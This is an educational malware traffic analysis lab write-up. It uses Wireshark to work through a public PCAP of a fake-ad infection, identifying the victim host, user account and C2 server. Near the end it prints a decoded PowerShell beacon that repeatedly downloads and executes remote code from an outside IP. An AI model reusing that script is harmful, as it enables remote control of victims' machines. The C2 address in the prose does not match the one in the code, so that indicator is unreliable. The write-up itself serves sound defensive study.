# **Wireshark Malware Traffic Analysis Lab**

## **Overview**
This lab focuses on analyzing network traffic to identify indicators of infection on a Windows client using **Wireshark**. The analysis is based on a **packet capture (PCAP) file** provided by [Malware Traffic Analysis](https://malware-traffic-analysis.net). The exercise follows a real-world malware investigation scenario, where we will examine network traffic, extract relevant artifacts, and answer key incident response questions. **important The answer sheet for this post-infection analysis uses a different pcap than the one provided in the link above. hence we cannot use it to validate our answers.**

The specific exercise being analyzed can be found here:  
[Malware Traffic Analysis Exercise - January 22, 2025](https://malware-traffic-analysis.net/2025/01/22/index.html).

The purpose of this lab is educational. The aim is to gain hands-on experience with the investigative steps required to identify indicators of compromise (IOCs) in a network capture, while addressing realistic threats relevant to 2025.

In this lab, I simulate a network infection scenario involving a fake Microsoft Teams advertisement delivering a malicious PowerShell script. The analysis focuses on identifying the infected host, C2 server, and malicious payload delivery mechanisms using Wireshark. Because the pcap available on the website does not contain the activities necessary to identify question 5 and 6 from the http requests, this lead to an interesting activity to dig deeper into the malicious payload downloaded. I was able to decode the powersheell script by de-obfuscating the string, and using a base 64 decoding algorithm

From the malicious powershell script, we were able to find that the malware uses the infected machine's C drive serial number to create a unique identifier for the host. We also found that the malware has its C2(Command & Control) server at 5.252.153.41 because it contacts this server every 5 second in an inifite loop.


Tools Used:
Host-only Linux VM (Kali-based)

Wireshark (for PCAP analysis)

ChatGPT (used to assist in deobfuscating scripts, decoding payloads, and interpreting attack logic)


## **Scenario**
As a **Security Operations Center (SOC) analyst**, you receive a report from a user who claims that a coworker has downloaded a suspicious file after searching for **Google Authenticator**. The caller provides supporting details that align with reports shared on social media:

- **LinkedIn:** [Post by Unit42](https://www.linkedin.com/posts/unit42_2025-01-22-wednesday-a-malicious-ad-led-activity-7288213662329192450-ky3V/)
- **Twitter (X):** [Unit42 Intel Tweet](https://x.com/Unit42_Intel/status/1882448037030584611)

Upon initial investigation, you confirm that an infection has occurred. You retrieve a **PCAP file** containing network traffic associated with the incident. During analysis, several indicators align with details referenced in the GitHub page linked within the social media posts. Following confirmation of the infection, an **incident report** is prepared.

## **Incident Response Tasks**
The goal of this exercise is to answer the following questions based on **PCAP analysis**:

1. **What is the IP address of the infected Windows client?**  
2. **What is the MAC address of the infected Windows client?**  
3. **What is the hostname of the infected Windows client?**  
4. **What is the user account name on the infected Windows client?**  
5. **What is the likely domain name associated with the fake Google Authenticator page?**  
6. **What are the command-and-control (C2) server IP addresses used in this infection?**

## **Lab Setup and Steps**
### **Step 1: Download the PCAP File**
- Obtain the **post-infection PCAP file** from the exercise page.
- The **password** for the file can be found in the following reference:  
  [Malware Traffic Analysis - About Page](https://malware-traffic-analysis.net/about.html)

### **Step 2: Transfer the PCAP File to a Virtual Machine**
To analyze the file securely, it is recommended to transfer it to a **virtual machine** (VM). If you need to share files between the host machine and the VM, follow these steps:

#### **Method: Python HTTP Server**
1. Open a command prompt in the directory containing the PCAP file.
2. Run the following command to start a simple HTTP server:
   ```bash
   python -m http.server 8080
   ```
3. Open a terminal in your VM
4. Run the following command to download the shared file to your VM
   ```bash
   wget http://192.168.56.1:8080/yourfilename
   ```
### **Step 3: Configure Wireshark for Analysis**
1. Remove unnecessary columns (e.g., Packet Number) for a clearer display.
2. Change the time format to display the full date and time for easier event correlation.


![Untitled design (2)](https://github.com/user-attachments/assets/a5e07850-b490-4572-9c72-e210432948b9)

### Initial Investigation
1) used view object content on wireshark to view the files that are part of the pcap file
2) save the file
3) view object properties to get the hash of the file
4) search the has on virus total to determine whether its an infected file

### Q1)  **What is the IP address of the infected Windows client?**  
I found the host ip(victim ip) by taking the ip address under the source column for the http requests. Answer: 10.1.17.215
![image](https://github.com/user-attachments/assets/3f066b17-faa8-4425-b5be-d2f458633b23)

### Q2) **What is the MAC address of the infected Windows client?**  
I found the MAC address by going into the packet details of one of the http request packet, exploding the Ethernet section, and finding the HEX value of the source. Answer: 00:d0:b7:26:4a:74
![image](https://github.com/user-attachments/assets/6afb7c95-ea27-49e2-beea-fa7fd94855a8)

### Q3) **What is the hostname of the infected Windows client?**  
I found the hostname by first filtering to only dhcp requests, then exploding option 12 of the packet details(host name). Answer: DESKTOP-L8C5GSJ
### Q4) **What is the user account name on the infected Windows client?** 
I found the user account name by using the Kerberos query: kerberos.CNameString. From that, I was able to filter for kerberos activities (windows authentication protocol) and found the account under the cname field: shutchenson.
![image](https://github.com/user-attachments/assets/ab7e6f8b-e719-4bc0-9206-63763a6fc099)

### Q5) **What is the likely domain name associated with the fake page?** 
I investigated the pcap file by first filtering http get requests. I followed the tcp stream of a request that received a powershell script. From there, I found all information available about how the attack happened. What I noticed is that the only information available about the host is the following ip address: 5.252.153.41
### Q6) **What are the command-and-control (C2) server IP addresses used in this infection?**
Using AI, I decoded the ps1 file found in the objects of the pcap, and found that the C2 server is also: 5.252.153.41


### Finding and decoding the malicious powershell script
When looking to find the malicious powershell script that was connecting to the C2 server, I found a powershell script in the list of objects on the PCAP file
![image](https://github.com/user-attachments/assets/b364d061-7b4b-47ca-a83d-0981d9778004)

When I opened the script, I found that it does not look like code, but rather a cypher. I used AI to understand how to decode the cypher. I understood that the cypher contained characters to obfuscate(these can be found from the first and last line of the ps1 file). I also understood that the remainder of the code is in base-64 encoding.
the code to extract the malicious code in found here: https://github.com/yasserhous/PCAP-Analysis-with-Wireshark/blob/Master/decoder.py

The malicious code is the following:
```bash
$fso = New-Object -Com "Scripting.FileSystemObject"
$SerialNumber = $fso.GetDrive("c:\").SerialNumber
$SerialNumber = "{0:X}" -f $SerialNumber
$SerialNumber = [convert]::toint64($SerialNumber,16)
$serial = $SerialNumber
$ip = 'http://5.252.153.241/'
$url = $ip+$serial
$s = New-Object System.Net.WebClient
while ($true) {
    try {
        $result=$s.DownloadString($url)
    }
    catch {
        Start-Sleep -s 5
        continue
    }
    Invoke-Expression $result
    Start-Sleep -s 5
}
```
As mentioned prior, the script creates a unique URL for the infected machine "$url = $ip+$serial" , and then through an infinite loop, it attempts to contact home ( $result=$s.DownloadString($url)) every 5 seconds.



sources:
https://malware-traffic-analysis.net/2025/01/22/index.html
https://www.youtube.com/watch?v=3t1BNAavrlQ&t=11s
